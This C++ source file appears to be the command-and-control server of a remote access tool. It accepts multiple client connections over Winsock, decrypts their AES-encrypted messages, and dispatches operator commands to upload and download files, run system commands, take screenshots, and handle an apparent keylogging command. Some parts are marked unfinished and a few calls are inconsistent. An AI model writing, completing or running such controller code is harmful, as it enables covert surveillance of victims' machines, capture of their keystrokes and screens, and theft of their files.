#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "DATA.h"
#include "cmdTypeFn.h"
#include "helper.h"
#include "initSock.h"

SOCKET g_client = 0;
char g_command[MAX_PATH] = {};
char g_arg1[MAX_PATH] = {};
char g_arg2[MAX_PATH] = {};

CLIENT_INFO g_ClientSocks[LISTEN_COUNT] = {};   // use g_curClientIndex to get the current client's info
int g_curClientIndex = 0;   // current client
int g_ClientCount = 0;		// current amount of connected clients


// not done
void ExecCmd(SOCKET g_client, char* pCmd, char* pArg1/*src*/, char* pArg2/*dest*/) {  // pair 1 msg transferring
	if (!strcmp(CMD_UPLOAD, pCmd)) {
		SendMsgInfo(g_client, UPLOAD, sizeof(MSG_INFO), pArg2, MAX_PATH);
	}
	else if (!strcmp(CMD_DOWLOAD, pCmd)) {
		SendMsgInfo(g_client, DOWNLOAD, sizeof(MSG_INFO), pArg1, MAX_PATH);
	}
	else if (!strcmp(CMD_SYSTEM, pCmd)) {
		SendMsgInfo(g_client, SYS, sizeof(MSG_INFO), pArg1, MAX_PATH);
		SystemCmd(g_client, pArg1, pArg2);
	}
	else if (!strcmp(CMD_SCREENSHOT, pCmd)) {
		SendMsgInfo(g_client, SCREEN, sizeof(MSG_INFO), pArg1, MAX_PATH);
	}
	else if (!strcmp(CMD_CHANGE, pCmd)) {
		ChangeSession(pArg1);
	}
	else if (!strcmp(CMD_QUIT, pCmd)) {
		SendMsgInfo(g_client, QUIT, sizeof(MSG_INFO), pArg1, MAX_PATH);
		DeleteSock(g_curClientIndex);
		WSACleanup();
	}
	else {
		return;
	}

}

// done
void AnalyzeCmd(SOCKET g_client, char* pCmd) {

	int index = 0;
	int j = 0;
	for (int i = 0; i < strlen(pCmd); i++)
	{
		
		if (pCmd[i] != ' ')
		{
			if (index == 0)
			{
				g_command[j++] = pCmd[i];
			}
			else if (index == 1)
			{
				g_arg1[j++] = pCmd[i];
			}
			else if (index == 2)
			{
				g_arg2[j++] = pCmd[i];
			}
		}
		else
		{
			index += 1;
			j = 0;
		}

	}
	ExecCmd(g_client, g_command, g_arg1, g_arg2);
}







DWORD WINAPI RecvProc(LPVOID lpThreadParameter)
{
	SOCKET newDude = (SOCKET)lpThreadParameter;
	if (newDude > 0) {
		AddSock(newDude); // add a client to the slot.
		PUCHAR tempKey = GetAESKey();
		PUCHAR tempIv = GetAESIv();
		printf("tempKey: %s\n", tempKey);
		printf("tempIv: %s\n", tempIv);

	}
	printf("g_ClientSocks[g_curClientIndex].client = %d\ng_curClientIndex = %d\ng_ClientCount= %d\n", g_ClientSocks[g_curClientIndex].client, g_curClientIndex, g_ClientCount);


	while (true)
	{

		MSG_INFO msgInfo = {};
		int recFlag = recv(g_client, (char*)&msgInfo,    // pair 2 msg transferring
			sizeof(MSG_INFO), NULL);
		if (recFlag == 0 || recFlag == -1) {
			printf("\nnothing received ---> disconnect\n");
			break;
		}
		AESDecrpty((PCUCHAR)&msgInfo, sizeof(MSG_INFO), (PUCHAR)&msgInfo);
		printf("type: %d\n", msgInfo.type);
		switch (msgInfo.type)
		{
		case OTHER:
			break;
		case UPLOAD:
			UploadFile(msgInfo);
			break;
		case DOWNLOAD:		//done  remember to use arg1 as the src, arg2 as the dest , add the absolute path if possible
			DownloadFile(msgInfo);
			 break;
		case SYS:			//done
			SystemCmd(g_client);
			break;
		case SCREEN:			// done   but cannot exit automatically
			RecvScreenPic(msgInfo);
			break;
		case CHANGE:
			ChangeSession(msgInfo.arg);
			break;
		case KEY:
			KeyCmd(g_client);
			break;
		default:
			break;
		}
	}
	return 0;
}



DWORD WINAPI AcceptProc(LPVOID lpThreadParameter)
{
	SOCKET ListenSocket = (SOCKET)lpThreadParameter;
	while (true)
	{

		SOCKADDR_IN out = {};
		int size = sizeof(out);
		SOCKET ClientSock = accept(
			ListenSocket,		
			(sockaddr*)&out,	
			&size				
		);
		if (INVALID_SOCKET == ClientSock)
		{
			successInitSock = FALSE;
			if (successInitSock == FALSE) {
				while (true) {
					printf("\nwaiting for connection from client.. \n");
					Sleep(2000);
					printf("\nstill don't get response from client after 2s..\n");

					successInitSock = InitSock();
					printf("\nserver.cpp  line 172: g_client: %d\n", g_client);
					if (g_client == 0) {
						continue;
					}

					printf("established connection with client.\n");
					break;
				}
			}
			printf("AcceptProc-- invalid socket.");
			continue;
		}

		char ip[20] = {};
		inet_ntop(AF_INET, &out.sin_addr.S_un, ip, 20);
		printf("\nip: %s \n", ip);
		
		
		if (ClientSock == SOCKET_ERROR) {
			printf("\nmainFeatures: line 163 failed: %d\n", WSAGetLastError());
			DeleteSock(g_newClientIndex);
			return FALSE;
		}

		if (g_ClientCount == 0) {
			g_client = ClientSock;
		}
		CreateThread(
			NULL, NULL,
			RecvProc, (LPVOID)ClientSock,
			NULL, NULL
		);


	}

	
	return 0;
}



void UserInputCommand() {
	while (true)
	{
		printf("server cmd>>$");
		char command[100] = {};
		gets_s(command, 100);
		if (!strcmp(CMD_QUIT, command)) {
			if (g_client) {
				DeleteSock(g_curClientIndex);
				SendMsgInfo(g_client, QUIT, 0);
				closesocket(g_client);
				WSACleanup();
			}
			if (g_ClientCount == 0)
			{
				exit(0);
			}
		}

		if (g_ClientCount == 0) {
			printf("Please wait patiently for other clients' initiative connection, %d\n", WSAGetLastError());
			continue;
		}
		cmdCleaner();
		AnalyzeCmd(
			g_client, // the g_client should be passed with the value ClientSock at the AcceptProc
			command
		);
	}
}
